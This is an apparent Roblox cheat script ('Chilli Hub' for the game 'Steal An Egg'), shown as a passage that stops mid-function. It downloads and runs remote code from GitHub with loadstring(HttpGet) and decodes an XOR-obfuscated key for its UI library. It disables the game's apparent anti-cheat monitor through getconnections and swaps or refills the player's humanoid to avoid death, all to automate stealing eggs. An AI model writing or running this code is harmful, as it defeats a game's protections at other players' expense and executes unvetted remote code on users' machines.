local fn, v, v2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, fn2, tbl, v3, fn3, fn4, tbl2, fn5, fn6, tbl3
local tbl4, fn7, tbl5, v4, v5, espSection, tbl6, color, sequence, palettes
local sheen

do
	local CollectionService, ProximityPromptService, v6, v7, tbl7, tbl8, tbl9

	do
		fn = function(arg)
			local genv = typeof(getgenv) == "function" and getgenv() or _G

			if type(genv.ChilliDebugPrint) == "function" then
				pcall(genv.ChilliDebugPrint, arg)
			end
		end

		task.spawn(pcall, function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
		end)

		local function fn8()
			local response = nil

			local function fn9()
				if type(response) == "string" and #response > 0 then
					return response
				end
				response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
				return response
			end

			local function fn10()
				local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup

				if type(chilliHubSaeCleanup) == "function" then
					pcall(chilliHubSaeCleanup)
				end

				local tbl10 = { game:GetService("CoreGui") }

				if typeof(gethui) == "function" then
					local ok, result = pcall(gethui)

					if ok and typeof(result) == "Instance" then
						table.insert(tbl10, result)
					end
				end

				local tbl11 = {
					Settings = true,
					ChilliLeftCenter = true,
					ChilliLibrarySettings = true,
					ChilliLibraryLauncher = true,
				}

				local n = 0

				for _, v8 in ipairs(tbl10) do
					for _, child in ipairs(v8:GetChildren()) do
						if child:IsA("ScreenGui") and (child:GetAttribute("ChilliLibraryOwned") == true or tbl11[child.Name]) then
							pcall(function()
								child:Destroy()
							end)

							n += 1
						end
					end
				end

				if n > 0 then
					fn("cleared " .. n .. " leftover Chilli UI screens")
				end
			end

			local function fn11()
				local v8 = fn9()
				local chunk, v9 = loadstring(v8)
				assert(chunk, v9)
				local v10 = chunk()
				assert(type(v10) == "function", "Chilli Library bootstrap is invalid.")
				local v11 = table.create(45)
				local n = 1

				for i = 1, 90, 2 do
					v11[n] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (n - 1) % 8 + 1)))
					n += 1
				end

				return v10(table.concat(v11))
			end

			local chilliLibraryFailedToLoad = "unknown"

			for i = 1, 6 do
				task.wait()
				pcall(fn10)
				local ok, result = pcall(fn11)
				if ok and type(result) == "table" then
					return result
				end
				chilliLibraryFailedToLoad = tostring(result)

				if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
					response = nil
				end

				fn("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
				task.wait(1 + i * 0.5)
			end

			error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
		end

		v = fn8()
		assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")

		v.ManualQuickDefaults = {
			PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
			Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
			PinGroups = {},
			LeftCenterHidden = true,
		}

		v2 = v:CreateWindow({ Name = "Chilli Hub - Steal An Egg", DefaultTab = "Farm" })
		defaultTab = v2:GetDefaultTab()
		Players = game:GetService("Players")
		RunService = game:GetService("RunService")
		ReplicatedStorage = game:GetService("ReplicatedStorage")
		CoreGui = game:GetService("CoreGui")
		UserInputService = game:GetService("UserInputService")
		CollectionService = game:GetService("CollectionService")
		game:GetService("LocalizationService")
		ProximityPromptService = game:GetService("ProximityPromptService")
		localPlayer = Players.LocalPlayer
		networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")

		fn2 = function(arg)
			local ok, result = pcall(function()
				return require(arg())
			end)

			return ok and result or nil
		end

		tbl = {
			EggState = fn2(function()
				return ReplicatedStorage.Client.EggState
			end),
			AreaEggs = fn2(function()
				return ReplicatedStorage.Shared.Types.AreaEggs
			end),
			ToolGameplayGuard = fn2(function()
				return ReplicatedStorage.Client.ToolGameplayGuard
			end),
			Assets = fn2(function()
				return ReplicatedStorage.Data.Assets
			end),
			Guards = fn2(function()
				return ReplicatedStorage.Data.Guards
			end),
			EggRecords = fn2(function()
				return ReplicatedStorage.Shared.Util.EggRecords
			end),
			Mutations = fn2(function()
				return ReplicatedStorage.Shared.Modules.Mutations
			end),
			Save = fn2(function()
				return ReplicatedStorage.Shared.Save
			end),
			FuseKernel = fn2(function()
				return ReplicatedStorage.Shared.Util.FuseKernel
			end),
			AreaEggCycle = fn2(function()
				return ReplicatedStorage.Shared.Util.AreaEggCycle
			end),
			AreaEggResetWall = fn2(function()
				return ReplicatedStorage.Client.AreaEggResetWall
			end),
			AreaEggResetCycle = fn2(function()
				return ReplicatedStorage.Data.AreaEggResetCycle
			end),
			Gears = fn2(function()
				return ReplicatedStorage.Data.Gears
			end),
			Areas = fn2(function()
				return ReplicatedStorage.Data.Areas
			end),
			LimitedEgg = fn2(function()
				return ReplicatedStorage.Data.LimitedEgg
			end),
			BrainrotEgg = fn2(function()
				return ReplicatedStorage.Data.BrainrotEgg
			end),
			MonsterEgg = fn2(function()
				return ReplicatedStorage.Data.MonsterEgg
			end),
		}

		local save = tbl.Save

		if type(save) == "table" and (type(save.Get) ~= "function" or type(save.FieldSignal) ~= "function") then
			tbl.Save = setmetatable({
				Get = type(save.Get) == "function" and save.Get or save.Peek,
				FieldSignal = type(save.FieldSignal) == "function" and save.FieldSignal or save.Watch,
			}, { __index = save })
		end

		local function fn9()
			if typeof(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		v3 = fn9()

		do
			local v8 = Random.new()
			local str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

			fn3 = function()
				local v9 = v8:NextInteger(12, 20)
				local v10 = table.create(v9)

				for i = 1, v9 do
					local v11 = v8:NextInteger(1, #str)
					v10[i] = string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", v11, v11)
				end

				return table.concat(v10)
			end
		end

		do
			local tbl10 = {}

			fn4 = function(arg)
				table.insert(tbl10, arg)
			end

			tbl2 = {}

			fn5 = function(arg, arg2)
				local n = 1000
				local n2 = 3
				local n3 = 12

				local function fn10(arg3)
					if arg3 <= 0 then
						return 0
					end
					local n4 = 10 ^ (math.floor(math.log10(arg3)) - 2)
					return math.floor(arg3 / n4 + 0.5) * n4
				end

				local function fn11(arg3)
					local n4 = math.clamp(tonumber(arg3) or 0, 0, 1000)
					if n4 <= 0 then
						return 0
					end
					return fn10(10 ^ (n2 + (n3 - n2) * n4 / n))
				end

				local function fn12(arg3)
					local n4 = tonumber(arg3) or 0
					if n4 <= 0 then
						return 0
					end
					local n5 = n3 - n2
					return math.clamp(math.floor((math.log10(n4) - n2) / n5 * n * 100 + 0.5) / 100, 0, 1000)
				end

				local function fn13(arg3)
					local str = string.format(arg3 >= 100 and "%.0f" or arg3 >= 10 and "%.1f" or "%.2f", arg3)

					if string.find(str, ".", 1, true) then
						str = string.gsub(string.gsub(str, "0+$", ""), "%.$", "")
					end

					return str
				end

				local function fn14(arg3)
					local v8 = fn11(arg3)
					if v8 <= 0 then
						return "Off"
					end

					if v8 < 1000000 then
						return fn13(v8 / 1000) .. " K/s"
					end

					if v8 < 1e9 then
						return fn13(v8 / 1000000) .. " M/s"
					end
					return fn13(v8 / 1e9) .. " B/s"
				end

				local function fn15(arg3)
					local v8 = fn11(arg3)
					if v8 <= 0 then
						return "0"
					end

					if v8 < 1000000 then
						return fn13(v8 / 1000) .. "k"
					end
					return (string.gsub(string.gsub(string.format("%.3f", v8 / 1000000), "0+$", ""), "%.$", ""))
				end

				local tbl11 = { k = 1000, m = 1000000, b = 1e9, t = 1e12 }

				local function fn16(arg3)
					local v8 = string.gsub(string.lower(string.gsub(tostring(arg3 or ""), "[%s,/]", "")), "s$", "")
					if v8 == "" or v8 == "off" then
						return 0
					end
					local v9, v10 = string.match(v8, "^([%d%.]+)([kmbt]?)$")
					local num = tonumber(v9)
					if not num then
						return nil
					end
					return fn12(num * (tbl11[v10] or 1000000))
				end

				local v8 = arg:CreateSlider({
					Name = arg2.Name,
					Note = arg2.Note,
					SubOf = arg2.SubOf,
					Min = 0,
					Max = n,
					Default = fn12(arg2.Default or 0),
					AllowDecimals = true,
					Increment = 0.01,
					ValueFormat = fn14,
					ValueParse = fn16,
					Callback = function(arg3)
						if type(arg2.OnRaw) == "function" then
							arg2.OnRaw(fn11(arg3))
						end
					end,
				})

				local value = type(v8) == "table" and rawget(v8, "Instance") or nil

				if typeof(value) == "Instance" then
					for _, descendant in ipairs(value:GetDescendants()) do
						if descendant:IsA("TextBox") then
							local connection = descendant.Focused:Connect(function()
								task.defer(function()
									if descendant:IsFocused() then
										local ok, result = pcall(v8.Get, v8)
										descendant.Text = fn15(ok and result or 0)
										descendant.CursorPosition = #descendant.Text + 1
										descendant.SelectionStart = 1
									end
								end)
							end)

							fn4(function()
								pcall(function()
									connection:Disconnect()
								end)
							end)
						end
					end
				end

				if type(arg2.Legacy) == "string" and type(arg2.SectionName) == "string" then
					table.insert(tbl2, { Handle = v8, Name = arg2.Name, Legacy = arg2.Legacy, Section = arg2.SectionName, StepOf = fn12 })
				end

				return v8
			end

			local text = "All"

			fn6 = function(arg)
				if type(arg) ~= "table" then
					return arg
				end
				local value = rawget(arg, "Instance")
				if typeof(value) ~= "Instance" then
					return arg
				end
				local flag = false

				local function fn10(arg2)
					if flag then
						return
					end

					if arg2.Text == "None" then
						flag = true
						arg2.Text = text
						flag = false
					end
				end

				local function fn11(descendant)
					if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
						return
					end
					fn10(descendant)

					local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						fn10(descendant)
					end)

					fn4(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)
				end

				for _, descendant in ipairs(value:GetDescendants()) do
					fn11(descendant)
				end

				local connection = value.DescendantAdded:Connect(fn11)

				fn4(function()
					pcall(function()
						connection:Disconnect()
					end)
				end)

				return arg
			end

			local genv = typeof(getgenv) == "function" and getgenv() or _G
			local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

			if type(chilliHubSaeCleanup) == "function" then
				pcall(chilliHubSaeCleanup)
			end

			genv.ChilliHubSaeCleanup = function()
				for i = #tbl10, 1, -1 do
					pcall(tbl10[i])
				end

				table.clear(tbl10)
			end
		end

		do
			local n = 0
			local fn10 = nil

			fn10 = function(arg, arg2)
				local n2 = arg2 or 0

				if type(arg) == "table" then
					if n2 > 3 then
						return
					end
					local n3 = 0

					for k, v8 in pairs(arg) do
						n3 += 1

						if not (n3 > 20) then
							fn10(k, n2 + 1)
							fn10(v8, n2 + 1)
							continue
						end

						break
					end
				elseif typeof(arg) == "Instance" then
					pcall(arg.GetFullName, arg)
				else
					n += #tostring(arg)
				end
			end

			local tbl10 = {}

			local function fn11(arg)
				tbl10[#tbl10 + 1] = arg
			end

			local function fn12()
				for _, v8 in ipairs(tbl10) do
					pcall(function()
						v8:Disconnect()
					end)
				end

				table.clear(tbl10)
			end

			local function chilliToolKeeper()
				fn12()

				for _, v8 in ipairs({
					"RE/GearSatchel/Lost",
					"RE/GearSatchel/Gained",
					"RE/RigSync/ProbeSatchel",
					"RE/RigSync/SeedSatchel",
					"RE/RigSync/CorrectionBegan",
					"RE/RigSync/Refresh",
					"RE/ToolTrigger/Trigger",
					"RE/BatSwing/Trigger",
				}) do
					local v9 = networking:FindFirstChild(v8)

					if v9 and v9:IsA("RemoteEvent") then
						fn11(v9.OnClientEvent:Connect(function(...)
							fn10({ ... })
						end))
					end
				end

				local function fn13(arg)
					if not arg then
						return
					end

					fn11(arg.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							fn10({ child.Name, child.Parent })
						end
					end))

					fn11(arg.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							fn10({ child.Name })
						end
					end))
				end

				fn13(localPlayer:FindFirstChildOfClass("Backpack"))

				fn11(localPlayer.ChildAdded:Connect(function(child)
					if child:IsA("Backpack") then
						fn13(child)
					end
				end))

				task.spawn(function()
					pcall(function()
						local v8 = tbl.Save.Get()
						fn10({ v8.GearInventory, v8.Inventory }, 2)
					end)

					if type(getgc) == "function" then
						pcall(function()
							for _, v8 in ipairs(getgc(false)) do
								if type(v8) == "function" and islclosure(v8) then
									pcall(debug.info, v8, "n")
								end
							end
						end)
					end
				end)
			end
			;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
			task.defer(chilliToolKeeper)
			fn4(fn12)
		end

		do
			local n = 0.35
			local n2 = 5
			local tbl10 = {}
			local flag = true

			tbl3 = {
				Add = function(arg)
					local tbl11 = { Run = arg, Gap = n, Idle = n2, Repeat = false, Hold = 0 }
					table.insert(tbl10, tbl11)
					return tbl11
				end,
				Wake = function()
					flag = true
				end,
				Backoff = function(arg, arg2)
					if arg then
						arg.Hold = tonumber(arg2) or 6
					end
				end,
			}

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				local v8 = flag
				flag = false

				for _, v9 in ipairs(tbl10) do
					v9.Gap = v9.Gap + deltaTime
					v9.Idle = v9.Idle + deltaTime

					if v9.Hold > 0 then
						v9.Hold = v9.Hold - deltaTime
					elseif v9.Gap >= n and (v8 or v9.Repeat or v9.Idle >= n2) then
						v9.Gap = 0
						v9.Idle = 0
						local ok, result = pcall(v9.Run, v9)
						v9.Repeat = ok and result == true
					end
				end
			end)

			fn4(function()
				connection:Disconnect()
			end)
		end

		v6 = defaultTab:CreateSection({ Name = "Dr Scramble Mech (New)", Expanded = false })
		local v8
		v8 = defaultTab:CreateSection({ Name = "Auto Steal", Expanded = true })
		local v9
		v9 = defaultTab:CreateSection({ Name = "Auto Place Egg", Expanded = false })
		local v10
		v10 = defaultTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
		local v11
		v11 = defaultTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
		local v12
		v12 = defaultTab:CreateSection({ Name = "Auto Sell", Expanded = false })
		local v13
		v13 = defaultTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
		v7 = defaultTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
		tbl7 = { Paused = false }

		do
			local n = 0.5
			local v14 = nil
			local tbl10 = nil
			local tbl11 = {}
			local flag = false
			local n2 = 0

			local function fn10()
				for i = #tbl11, 1, -1 do
					local v15 = tbl11[i]

					if v15 and v15.Connected then
						v15:Disconnect()
					end

					tbl11[i] = nil
				end
			end

			local function fn11()
				fn10()
				local v15 = v14
				local v16 = tbl10
				v14 = nil
				tbl10 = nil
				if not v15 or not v15.Parent or not v16 then
					return
				end

				pcall(function()
					v15.BreakJointsOnDeath = v16.BreakJointsOnDeath
					v15.RequiresNeck = v16.RequiresNeck
					v15:SetStateEnabled(Enum.HumanoidStateType.Dead, v16.DeadEnabled)
				end)
			end

			local function fn12(arg)
				if not arg or not arg.Parent then
					return false
				end

				return pcall(function()
					arg.BreakJointsOnDeath = false
					arg.RequiresNeck = false
					arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
				end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end

			local function fn13(arg)
				if tbl7.Paused or arg ~= v14 or not arg or not arg.Parent or flag then
					return false
				end
				local maxHealth = arg.MaxHealth
				if maxHealth <= 0 then
					return false
				end

				if maxHealth == math.huge or arg.Health >= maxHealth then
					return true
				end
				flag = true

				local ok = pcall(function()
					arg.Health = maxHealth
				end)

				flag = false
				return ok and arg.Health >= maxHealth
			end

			local function fn14(arg)
				if arg == v14 and arg and arg.Parent then
					return true
				end
				fn11()
				if not arg or not arg:IsA("Humanoid") or not arg.Parent then
					return false
				end
				v14 = arg

				tbl10 = {
					BreakJointsOnDeath = arg.BreakJointsOnDeath,
					RequiresNeck = arg.RequiresNeck,
					DeadEnabled = arg:GetStateEnabled(Enum.HumanoidStateType.Dead),
				}

				if not fn12(arg) then
					fn11()
					return false
				end
				fn13(arg)

				tbl11[#tbl11 + 1] = arg.HealthChanged:Connect(function()
					fn13(arg)
				end)

				tbl11[#tbl11 + 1] = arg:GetPropertyChangedSignal("MaxHealth"):Connect(function()
					fn13(arg)
				end)

				tbl11[#tbl11 + 1] = arg.StateChanged:Connect(function(old, new)
					if new == Enum.HumanoidStateType.Dead and not tbl7.Paused then
						fn12(arg)
						fn13(arg)
					end
				end)

				n2 = os.clock()
				return true
			end

			local function fn15()
				local character = localPlayer.Character
				return character and character:FindFirstChildOfClass("Humanoid") or nil
			end

			local connection = localPlayer.CharacterAdded:Connect(function()
				task.defer(function()
					fn14(fn15())
				end)
			end)

			local connection2 = RunService.Heartbeat:Connect(function()
				local now = os.clock()
				if tbl7.Paused or now - n2 < n then
					return
				end
				n2 = now
				local v15 = fn15()
				if v15 ~= v14 then
					fn14(v15)
					return
				end

				if v15 then
					fn12(v15)
					fn13(v15)
				end
			end)

			task.defer(function()
				fn14(fn15())
			end)

			fn4(function()
				if connection then
					connection:Disconnect()
				end

				if connection2 then
					connection2:Disconnect()
				end

				fn11()
			end)
		end

		local tbl10 = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }

		tbl4 = {
			Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
			SafeCarry = {
				Enabled = true,
				SkipUnsafe = false,
				WaitGuard = false,
				SameSpeedBigEggs = false,
				Blocked = {},
				StretchSeconds = 6,
				BeatGuard = false,
				SlowUntil = 0,
				SlowFactor = 0.3,
				CarryScale = 1,
				EasyRatio = 1.3,
				LastSkip = nil,
				Category = nil,
				PlanOk = true,
				LightMult = 0.96,
				Height = 70,
				ClimbShare = 0.5,
				Approach = "Run",
				RunSpeed = 1.15,
				RunWait = 0,
				RunAnimate = true,
				RunHeight = 50,
				StraightRun = true,
				RunStyle = "Velocity",
				CarryStyle = "Velocity",
				SpeedJitter = 0.08,
				Wobble = 0,
				LaneOffset = 0,
				JumpsPerMinute = 0,
				PausesPerMinute = 0,
				ReactMin = 0.2,
				ReactMax = 0.6,
				CarryReact = 0,
				SpeedRatio = 1.5,
				ExcessSeconds = 5.5,
				GuardMargin = 4,
				GuardRatio = 1.06,
				MinRatio = 1.1,
				BaseWait = 6.5,
				FreeJump = 1500,
				WaitRate = 0.9,
				RecoverTries = math.huge,
				GuessMult = 0.93,
				CarryRatio = 0.9,
				Mult = 1,
				Seen = {},
				JumpDistance = 0,
				JumpAt = 0,
				LastDelivered = 0,
				LastFailed = 0,
				Handle = nil,
			},
			Movement = {
				Owner = nil,
				PlaceWanted = false,
				StealFirst = false,
				MutationWanted = false,
				FracturedWanted = false,
			},
			AntiGuard = {
				Enabled = false,
				Busy = false,
				BusySince = 0,
				HitArms = 0,
				Handle = nil,
				Render = nil,
			},
			IsBatTool = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end

				if arg:GetAttribute("IsBat") == true then
					return true
				end
				local attribute = arg:GetAttribute("GearName")

				if type(attribute) == "string" then
					local gears = tbl.Gears
					local directory = type(gears) == "table" and gears.Directory or nil
					local flag = type(directory) == "table" and directory[attribute] or nil
					return type(flag) == "table" and flag.BatControllerData ~= nil
				end

				if arg:GetAttribute("ItemType") ~= nil then
					return false
				end
				local v14 = string.lower(arg.Name)

				for _, v15 in ipairs(tbl10) do
					if string.find(v14, v15, 1, true) then
						return true
					end
				end

				return false
			end,
			FindBat = function()
				local character = localPlayer.Character
				local tool = character and character:FindFirstChildWhichIsA("Tool")
				if tbl4.IsBatTool(tool) then
					return tool
				end
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")

				if backpack then
					for _, child in ipairs(backpack:GetChildren()) do
						if tbl4.IsBatTool(child) then
							return child
						end
					end
				end

				if character then
					for _, child in ipairs(character:GetChildren()) do
						if tbl4.IsBatTool(child) then
							return child
						end
					end
				end

				return nil
			end,
			IsNight = function()
				local areaEggCycle = tbl.AreaEggCycle
				if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
				return ok and result == true
			end,
			WallSealed = function()
				local areaEggResetWall = tbl.AreaEggResetWall
				if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggResetWall.IsSealed)
				return ok and result == true
			end,
			WallOpenDelay = function()
				local areaEggResetCycle = tbl.AreaEggResetCycle
				if type(areaEggResetCycle) ~= "table" then
					return 5
				end
				return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
			end,
			ClaimMovement = function(owner)
				local movement = tbl4.Movement
				if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
					movement.Owner = owner
					return true
				end
				return false
			end,
			ReleaseMovement = function(arg)
				if tbl4.Movement.Owner == arg then
					tbl4.Movement.Owner = nil
				end
			end,
		}

		do
			local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
			tbl4.ShieldMethods = shieldMethods
			local v14 = shieldMethods[1]
			local tbl11 = {}
			local tbl12 = {}
			local connection = nil
			local n = 0
			local tbl13 = { Original = nil, Clone = nil, Links = {} }
			local connection2 = nil
			local tbl14 = {}

			local function fn10()
				for _, v15 in ipairs(tbl14) do
					task.defer(function()
						pcall(v15)
					end)
				end
			end

			tbl4.OnHumanoidChanged = function(arg)
				table.insert(tbl14, arg)
				local tbl15

				tbl15 = {
					Connected = true,
					Disconnect = function()
						tbl15.Connected = false
						local v15 = table.find(tbl14, arg)

						if v15 then
							table.remove(tbl14, v15)
						end
					end,
				}

				return tbl15
			end

			local function fn11(humanoid)
				pcall(function()
					local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
					playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")

					if playerScripts then
						local controls = require(playerScripts):GetControls()

						if type(controls) == "table" then
							controls.humanoid = humanoid
						end
					end
				end)
			end

			local function fn12(arg)
				local animate = arg and arg:FindFirstChild("Animate")

				if animate and animate:IsA("LocalScript") then
					task.spawn(function()
						animate.Enabled = false
						task.wait()
						animate.Enabled = true
					end)
				end
			end

			local function fn13()
				for _, link in ipairs(tbl13.Links) do
					pcall(function()
						link:Disconnect()
					end)
				end

				table.clear(tbl13.Links)
			end

			tbl4.UndoSwap = function()
				fn13()
				local character = localPlayer.Character
				local original = tbl13.Original
				local clone = tbl13.Clone
				local v15 = tbl13
				tbl13.Original = nil
				v15.Clone = nil

				if original and clone and character and original.Parent == nil and clone.Parent == character then
					original.Parent = character
					workspace.CurrentCamera.CameraSubject = original
					fn11(original)

					pcall(function()
						clone:Destroy()
					end)

					fn12(character)
					fn10()
				end
			end

			local tbl15 = {
				[Enum.HumanoidStateType.Running] = true,
				[Enum.HumanoidStateType.RunningNoPhysics] = true,
				[Enum.HumanoidStateType.Landed] = true,
			}

			tbl4.Grounded = function(arg)
				if not arg then
					arg = localPlayer.Character
					arg = arg and arg:FindFirstChildOfClass("Humanoid")
				end

				if not arg or arg.Health <= 0 or arg.FloorMaterial == Enum.Material.Air then
					return false
				end
				return tbl15[arg:GetState()] == true
			end

			tbl4.ShieldPaused = false

			tbl4.WalkSpeed = function()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")
				character = character and character.WalkSpeed or 16
				local original = tbl13.Original
				local n2

				if original and original.Health > 0 then
					n2 = math.min(character, original.WalkSpeed)
				else
					n2 = character
				end

				local ok, result = pcall(function()
					local leaderstats = localPlayer:FindFirstChild("leaderstats")
					leaderstats = leaderstats and leaderstats:FindFirstChild("Speed")
					local TreadmillUtil = require(ReplicatedStorage.Shared.Util.TreadmillUtil)
					return leaderstats and TreadmillUtil.SpeedPowerToWalkSpeed(leaderstats.Value) or nil
				end)

				local n3

				if ok and tonumber(result) and result > 0 then
					n3 = math.min(n2, result)
				else
					n3 = n2
				end

				return n3
			end

			local function fn14()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					return
				end

				if tbl13.Clone and tbl13.Clone.Parent == character then
					return
				end

				if not tbl4.Grounded(humanoid) then
					return
				end
				local clone = humanoid:Clone()
				humanoid.Parent = nil
				clone.Parent = character
				workspace.CurrentCamera.CameraSubject = clone
				fn11(clone)
				fn12(character)
				local v15 = tbl13
				tbl13.Original = humanoid
				v15.Clone = clone
				fn10()

				table.insert(tbl13.Links, humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
					if clone.Parent ~= nil then
						clone.WalkSpeed = humanoid.WalkSpeed
					end
				end))

				local animator = humanoid:FindFirstChildOfClass("Animator")
				local animator2 = clone:FindFirstChildOfClass("Animator")

				if animator and animator2 then
					table.insert(tbl13.Links, animator.AnimationPlayed:Connect(function(arg)
						local animation = arg.Animation
						if not animation or clone.Parent == nil then
							return
						end

						local ok, result = pcall(function()
							return animator2:LoadAnimation(animation)
						end)

						if not ok or not result then
							return
						end

						pcall(function()
							result.Priority = arg.Priority
							result.Looped = arg.Looped
							local speed = arg.Speed
							result:Play(0.05, math.max(arg.WeightTarget, 0.01), speed)
						end)

						local connection3 = nil

						connection3 = arg.Stopped:Connect(function()
							connection3:Disconnect()

							pcall(function()
								result:Stop(0.1)
							end)
						end)
					end))
				end

				table.insert(tbl13.Links, clone.Died:Connect(function()
					fn13()
					local v16 = tbl13
					tbl13.Original = nil
					v16.Clone = nil
					local character2 = localPlayer.Character

					if character2 and humanoid.Parent == nil then
						humanoid.Parent = character2
						workspace.CurrentCamera.CameraSubject = humanoid
						fn11(humanoid)
						fn10()
					end

					pcall(function()
						clone:Destroy()
					end)

					humanoid.Health = 0
				end))
			end

			local function fn15()
				if type(getconnections) ~= "function" then
					return
				end

				for _, v15 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
					local ok, result = pcall(getconnections, v15)

					if ok and type(result) == "table" then
						for _, v16 in ipairs(result) do
							local ok2, result2 = pcall(function()
								return v16.Function
							end)

							ok2 = ok2 and type(result2) == "function"
							local flag = false
							local result3 = nil

							if ok2 then
								flag, result3 = pcall(debug.info, result2, "s")
							end

							if flag and string.find(tostring(result3), "UGI", 1, true) then
								local ok3, result4 = pcall(function()
									return v16.Enabled
								end)

								if not ok3 or result4 ~= false then
									if pcall(function()
										v16:Disable()
									end) then
										table.insert(tbl12, v16)
									end
								end
							end
						end
					end
				end
			end

			local function fn16()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end

				for _, v15 in ipairs(tbl12) do
					pcall(function()
						v15:Enable()
					end)
				end

				table.clear(tbl12)
			end

			local function fn17()
				if tbl4.ShieldPaused then
					return
				end

				if v14 == shieldMethods[1] then
					fn14()
				else
					fn15()
				end
			end

			local function fn18()
				fn17()
				n = 0

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n += deltaTime
					local character = localPlayer.Character
					local flag = v14 == shieldMethods[1]

					if flag then
						flag = not (tbl13.Clone and character and tbl13.Clone.Parent == character)
					end

					if n >= (flag and 0.25 or 3) then
						n = 0
						fn17()
					end
				end)

				connection2 = localPlayer.CharacterAdded:Connect(function(character)
					fn13()
					local v15 = tbl13
					tbl13.Original = nil
					v15.Clone = nil
					if v14 ~= shieldMethods[1] then
						return
					end

					task.spawn(function()
						character:WaitForChild("Humanoid", 10)
						task.wait(1)

						if connection and localPlayer.Character == character then
							fn17()
						end
					end)
				end)
			end

			tbl4.Swapped = function()
				if v14 ~= shieldMethods[1] then
					return true
				end
				local character = localPlayer.Character
				return tbl13.Clone ~= nil and character ~= nil and tbl13.Clone.Parent == character
			end

			tbl4.Shield = function(arg, arg2)
				tbl11[arg] = arg2 == true or nil
				if next(tbl11) == nil then
					fn16()
					return
				end

				if connection then
					return
				end
				fn18()
			end

			tbl4.SetShieldMethod = function(arg)
				if not table.find(shieldMethods, arg) or arg == v14 then
					return
				end
				local flag = connection ~= nil
				fn16()
				v14 = arg

				if flag and next(tbl11) ~= nil then
					fn18()
				end
			end

			fn4(fn16)
		end

		tbl4.Shield("load", true)

		tbl4.Toggle = function(arg, arg2)
			if type(arg) ~= "table" then
				return arg2 == true
			end

			local ok, result = pcall(function()
				local controller = arg._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(result) == "boolean" then
				return result
			end

			for _, v14 in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return arg[v14]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, arg)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return arg2 == true
		end

		tbl4.Root = function()
			local character = localPlayer.Character
			character = character and character:FindFirstChild("HumanoidRootPart")
			return character and character:IsDescendantOf(workspace) and character or nil
		end

		tbl4.PlacedPoints = function()
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local tbl11 = {}
			if not placedEggRenders then
				return tbl11
			end
			local str = tostring(localPlayer.UserId)

			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, str, 1, true) then
					local ok, result = pcall(function()
						return child:IsA("Model") and child:GetPivot() or child.CFrame
					end)

					if ok then
						table.insert(tbl11, result.Position)
					end
				end
			end

